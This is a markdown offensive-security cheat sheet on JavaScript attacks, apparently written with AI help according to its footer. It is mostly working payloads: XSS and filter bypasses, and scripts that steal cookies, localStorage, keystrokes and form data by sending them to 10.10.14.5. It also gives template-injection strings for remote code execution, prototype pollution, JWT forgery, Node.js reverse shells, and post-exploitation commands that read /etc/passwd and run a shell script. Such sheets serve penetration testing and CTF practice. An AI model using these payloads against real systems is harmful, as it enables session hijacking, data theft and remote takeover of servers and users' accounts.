# JavaScript

**Tags:** `#javascript` `#xss` `#nodejs` `#scripting` `#webappsec` `#deserialization`

JavaScript is both an attack surface and an attack tool. Client-side JS is the primary XSS payload language. Server-side Node.js introduces RCE vectors via deserialization, SSTI, prototype pollution, and command injection. Understanding JS is also required to audit SPAs, analyze JWT logic, and interact with modern web APIs.

> [!note]
> Browser context (DOM XSS, reflected XSS) and server context (Node.js RCE) have different APIs and constraints. The payloads are different — `document.cookie` doesn't exist in Node; `child_process.exec` doesn't exist in the browser.

---

## XSS Payloads

```javascript
// Basic alert (PoC)
<script>alert(1)</script>
<script>alert(document.domain)</script>

// Event handlers (when script tags are filtered)
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<body onload=alert(1)>
<input autofocus onfocus=alert(1)>
<details open ontoggle=alert(1)>

// Href / javascript: URI
<a href="javascript:alert(1)">click</a>

// Template literal / string bypass
<script>alert`1`</script>

// Without parentheses
<script>throw onerror=alert,1</script>

// CSS-based
<style>@import'javascript:alert(1)'</style>

// Polyglot (works in multiple contexts)
jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e
```

---

## XSS Data Exfiltration

```javascript
// Steal cookies
<script>document.location='http://10.10.14.5/steal?c='+document.cookie</script>
<script>new Image().src='http://10.10.14.5/steal?c='+document.cookie</script>
<script>fetch('http://10.10.14.5/steal?c='+btoa(document.cookie))</script>

// Grab localStorage
<script>fetch('http://10.10.14.5/?l='+btoa(JSON.stringify(localStorage)))</script>

// Keylogger
<script>document.onkeypress=function(e){fetch('http://10.10.14.5/?k='+e.key)}</script>

// Capture form submission
<script>
document.forms[0].addEventListener('submit', function(e){
    fetch('http://10.10.14.5/?d='+btoa(new URLSearchParams(new FormData(e.target)).toString()))
});
</script>

// Full page exfil
<script>fetch('http://10.10.14.5/?p='+btoa(document.documentElement.innerHTML))</script>

// CSRF via XSS (perform action as victim)
<script>
fetch('/transfer', {
    method: 'POST',
    credentials: 'include',
    headers: {'Content-Type': 'application/json'},
    body: JSON.stringify({to: 'attacker', amount: 1000})
})
</script>
```

---

## XSS Filter Bypass

```javascript
// Case variation
<ScRiPt>alert(1)</ScRiPt>

// HTML entities (inside attributes)
<a href="&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;alert(1)">

// Double encoding
%253Cscript%253Ealert(1)%253C%252Fscript%253E

// Null bytes (old browsers)
<scr\x00ipt>alert(1)</scr\x00ipt>

// Closing tag injection (out of attribute context)
"></script><script>alert(1)//

// Breaking out of JS string context
';alert(1)//
\';alert(1)//
</script><script>alert(1)

// Template context (AngularJS)
{{constructor.constructor('alert(1)')()}}
{{$on.constructor('alert(1)')()}}

// Markdown XSS
[XSS](javascript:alert(1))
![XSS](x onerror=alert(1))
```

---

## DOM XSS Sources & Sinks

```javascript
// Sources (attacker-controlled input)
document.URL
document.location
document.referrer
window.location.hash
window.location.search
document.cookie

// Sinks (dangerous operations)
eval()
document.write()
document.writeln()
innerHTML
outerHTML
insertAdjacentHTML()
location.href = (input)
setTimeout(input)       // string argument → eval
setInterval(input)
new Function(input)
$.html(input)           // jQuery
$('body').html(input)

// AngularJS template injection sinks
ng-bind-html
ng-include
```

---

## Node.js RCE Patterns

```javascript
// Command injection via child_process
const { exec, execSync, spawn } = require('child_process');
exec('id', (err, stdout) => console.log(stdout));
console.log(execSync('id').toString());

// If you can inject into eval / Function
eval('require("child_process").execSync("id").toString()')

// SSTI / template injection → RCE
// Handlebars
{{#with "s" as |string|}}
  {{#with "e"}}
    {{#with split as |conslist|}}
      {{this.pop}}
      {{this.push (lookup string.sub "constructor")}}
      {{this.pop}}
      {{#with string.split as |codelist|}}
        {{this.pop}}
        {{this.push "return require('child_process').execSync('id').toString()"}}
        {{this.pop}}
        {{#each conslist}}
          {{#with (string.sub.apply 0 codelist)}}
            {{this}}
          {{/with}}
        {{/each}}
      {{/with}}
    {{/with}}
  {{/with}}
{{/with}}

// EJS SSTI
<%= global.process.mainModule.require('child_process').execSync('id').toString() %>

// Pug SSTI
#{function(){localLoad=global.process.mainModule.constructor._resolveFilename('child_process');childProcess=eval("require")(localLoad);return childProcess.execSync('id').toString()}()}
```

---

## Prototype Pollution

```javascript
// Polluting Object.prototype via merge/assign functions
// Payload in JSON/query string:
{"__proto__":{"admin":true}}
{"__proto__":{"isAdmin":true}}

// Nested path pollution
{"constructor":{"prototype":{"admin":true}}}

// Check if polluted
Object.prototype.admin  // should return undefined on clean target

// RCE via prototype pollution (Node.js with child_process gadgets)
// PP into __proto__ → triggers child_process exec gadget
{"__proto__":{"shell":"node","NODE_OPTIONS":"--inspect=exploit"}}

// Common PP sinks in libraries
lodash _.merge()
jQuery $.extend(true, ...)
hoek utils.merge()
mpath path assignment
```

---

## JWT Attacks

```javascript
// Decode JWT (no verify)
const [header, payload, sig] = token.split('.');
JSON.parse(atob(header));
JSON.parse(atob(payload));

// Algorithm confusion — change alg to none
// 1. Decode header
// 2. Change {"alg":"HS256"} → {"alg":"none"}
// 3. Re-encode, modify payload, remove signature
// Result: header.payload. (trailing dot, empty sig)

// RS256 → HS256 confusion (sign with public key as HMAC secret)
// Use jwt_tool or manually:
// 1. Get server's public key
// 2. Change alg RS256 → HS256
// 3. Sign with public key bytes as HMAC-SHA256 secret

// kid injection (if kid header used in SQL/file read)
{"kid": "../../dev/null"}            // null key → HMAC sign with empty string
{"kid": "' UNION SELECT 'secret'--"} // SQLi in kid → control signing key

// jwks confusion (if alg allows embedded key)
// Embed your own public key in jku/x5u header pointing to attacker server
```

---

## Node.js Reverse Shell

```javascript
// One-liner
node -e "require('child_process').exec('bash -c \"bash -i >& /dev/tcp/10.10.14.5/4444 0>&1\"')"

// Net module shell
(function(){
    var net = require("net"),
    cp = require("child_process"),
    sh = cp.spawn("/bin/sh",[]);
    var client = new net.Socket();
    client.connect(4444,"10.10.14.5",function(){
        client.pipe(sh.stdin);
        sh.stdout.pipe(client);
        sh.stderr.pipe(client);
    });
    return /a/;
})();
```

---

## Useful Browser Console

```javascript
// All cookies
document.cookie

// LocalStorage dump
JSON.stringify(localStorage)

// SessionStorage dump
JSON.stringify(sessionStorage)

// All forms on page
document.forms

// Links
Array.from(document.links).map(l => l.href)

// Scripts loaded
Array.from(document.scripts).map(s => s.src)

// CSRF token (common locations)
document.querySelector('input[name=csrf_token]').value
document.querySelector('meta[name=csrf-token]').content
document.querySelector('[name="_token"]').value

// Current user (common patterns)
window.__user__
window.currentUser
window.APP_DATA

// Make authenticated request from console
fetch('/api/admin/users', {credentials: 'include'}).then(r=>r.json()).then(console.log)
```

---

## Node.js File / OS (Post-Exploitation)

```javascript
const fs = require('fs');
const os = require('os');
const { execSync } = require('child_process');

// System info
os.hostname()
os.userInfo()
os.platform()
os.networkInterfaces()

// File read
fs.readFileSync('/etc/passwd', 'utf8')

// Directory listing
fs.readdirSync('/home')

// Write file
fs.writeFileSync('/tmp/shell.sh', 'bash -i >& /dev/tcp/10.10.14.5/4444 0>&1')

// Execute
execSync('chmod +x /tmp/shell.sh && /tmp/shell.sh')

// Environment
process.env
process.env.HOME
process.env.PATH
```

---

*Created: 2026-03-13*
*Updated: 2026-03-13*
*Model: claude-sonnet-4-6*
